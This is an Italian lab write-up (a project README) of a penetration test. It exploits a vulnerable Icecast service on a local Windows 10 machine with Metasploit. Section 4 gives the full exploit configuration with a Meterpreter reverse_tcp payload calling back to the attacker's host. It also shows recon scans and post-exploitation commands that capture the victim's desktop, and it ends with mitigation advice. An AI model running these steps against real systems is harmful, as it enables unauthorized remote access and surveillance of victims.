
# 🔐 Penetration Test con Metasploit e Icecast su Windows 10

## Introduzione
In questo progetto abbiamo condotto un test di penetrazione su una macchina **Windows 10** con il servizio **Icecast** vulnerabile. Utilizzando il framework **Metasploit** su **Kali Linux**, siamo riusciti a ottenere una sessione Meterpreter, visualizzare l’indirizzo IP della vittima e catturare uno screenshot del desktop compromesso. Questo README descrive tutte le fasi del processo, corredandole con spazi dedicati agli screenshot che mostrano i vari step.

---

## Obiettivi
- **Identificare la macchina vittima** (con Icecast vulnerabile).
- **Sfruttare la vulnerabilità per ottenere una shell Meterpreter**.
- **Visualizzare l’indirizzo IP della vittima** dalla sessione Meterpreter.
- **Catturare uno screenshot del desktop della macchina vittima**.

---

## Ambiente di Lavoro
- **Attaccante (Kali Linux)**: IP `192.168.1.150`
- **Vittima (Windows 10 con Icecast)**: IP `192.168.1.153`
- **Rete:** 192.168.1.0/24

---

## Passi Seguiti

### 1. Scansione della Rete e Identificazione della Vittima
Abbiamo innanzitutto identificato la macchina vittima nella rete locale con:
```bash
sudo arp-scan --localnet
```
Una volta trovato l’IP della vittima (`192.168.1.153`), abbiamo verificato la porta di default di Icecast (8000):
```bash
nmap -p 8000 192.168.1.153
```

**Screenshot:**  
_(Inserire screenshot della scansione nmap che mostra la porta chiusa)_

---

### 2. Avvio di Icecast sulla Vittima e Verifica
Sulla macchina Windows 10 abbiamo:
- Avviato Icecast.
- Disattivato temporaneamente il firewall o creato una regola di eccezione per la porta 8000.

Quindi, verificando dal browser:
```
http://192.168.1.153:8000
```
Abbiamo ottenuto una risposta (anche se non mostrava una particolare risorsa), confermando che Icecast era attivo e rispondeva alle richieste.

**Screenshot:**  
_(Inserire screenshot del browser che mostra la risposta di Icecast)_

---

### 3. Verifica Porta 8000 Aperta
Nuovamente con nmap:
```bash
nmap -p 8000 192.168.1.153
```
Ora la porta 8000 risultava **open**, confermando che Icecast era accessibile dalla nostra macchina Kali.

**Screenshot:**  
_(Inserire screenshot della scansione nmap con la porta aperta)_

---

### 4. Sfruttamento della Vulnerabilità con Metasploit
Avviamo Metasploit:
```bash
msfconsole
```
Impostiamo il modulo exploit di Icecast:
```bash
use exploit/windows/http/icecast_header
set RHOSTS 192.168.1.153
set RPORT 8000
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.150
set LPORT 4444
exploit
```

Al primo tentativo, senza Icecast in ascolto, l’exploit falliva con `ConnectionRefused`. Dopo aver sistemato Icecast e il firewall, rilanciando `exploit`, abbiamo ottenuto una sessione Meterpreter con successo.

**Screenshot del primo tentativo fallito:**  
_(Inserire screenshot del tentativo fallito)_

**Screenshot della sessione Meterpreter ottenuta:**  
_(Inserire screenshot della sessione Meterpreter avviata con successo)_

---

### 5. Interazione con la Sessione Meterpreter
Ora che siamo dentro, possiamo eseguire comandi direttamente sulla macchina vittima. L’obiettivo era:
- **Visualizzare l’indirizzo IP della vittima**:
  ```bash
  meterpreter > ipconfig
  ```
  Questo mostra le interfacce e gli indirizzi IP della macchina Windows compromessa.

**Screenshot:**  
_(Inserire screenshot del comando ipconfig eseguito su Meterpreter)_

- **Catturare uno screenshot**:
  ```bash
  meterpreter > screenshot
  ```
  
  Lo screenshot viene salvato sulla macchina Kali (ad esempio `/home/kali/OquUbpix.jpeg`).

Per aprire l’immagine, **uscire da Meterpreter** (o aprire un nuovo terminale su Kali) e:
```bash
xdg-open /home/kali/OquUbpix.jpeg
```

**Screenshot del comando screenshot:**  
_(Inserire screenshot del comando screenshot eseguito con successo)_

**Visualizzazione dello screenshot:**  
_(Inserire screenshot dell’immagine visualizzata su Kali)_

---

## Post-Exploitation & Considerazioni

Dopo aver raggiunto gli obiettivi, si raccomanda di:
- Chiudere la sessione Meterpreter:
  ```bash
  meterpreter > exit
  ```
- Riattivare il firewall sulla macchina vittima.
- Aggiornare Icecast all’ultima versione per correggere la vulnerabilità sfruttata.
- Implementare regole IDS/IPS e segmentazione di rete per limitare l’impatto di eventuali attacchi futuri.

---

## Conclusioni

Questo test ha dimostrato come una vulnerabilità non corretta in un servizio (Icecast) possa fornire a un attaccante l’accesso remoto a una macchina Windows. Con Metasploit siamo riusciti a:

- Identificare la macchina vulnerabile.
- Avviare un exploit contro Icecast.
- Ottenere una shell Meterpreter.
- Visualizzare l’indirizzo IP della vittima.
- Catturare uno screenshot del desktop remoto.

**Emoji Key:**
- 🔍 Ricognizione
- 🚀 Exploit
- 💻 Meterpreter
- 🛡️ Difesa e Mitigazione
- 📸 Screenshot

---

## Allegati

Nella cartella [`/screenshots`](./screenshots/) sono presenti:
- **nmap_scan.png**: Risultati della prima scansione porta 8000 (chiusa).
- **icecast_browser.png**: Risposta dal browser dopo l’avvio di Icecast.
- **nmap_port_open.png**: Risultati della scansione quando la porta 8000 è aperta.
- **exploit_failed.png**: Tentativo fallito di exploit prima di avviare correttamente Icecast.
- **meterpreter_session.png**: Sessione Meterpreter ottenuta con successo.
- **ipconfig_meterpreter.png**: Output del comando ipconfig in Meterpreter.
- **screenshot_command.png**: Esecuzione del comando screenshot.
- **screenshot_view.png**: Visualizzazione dello screenshot catturato sul desktop Kali.

Tutte le immagini aiutano a comprendere visivamente i vari passaggi e i risultati ottenuti durante il test.
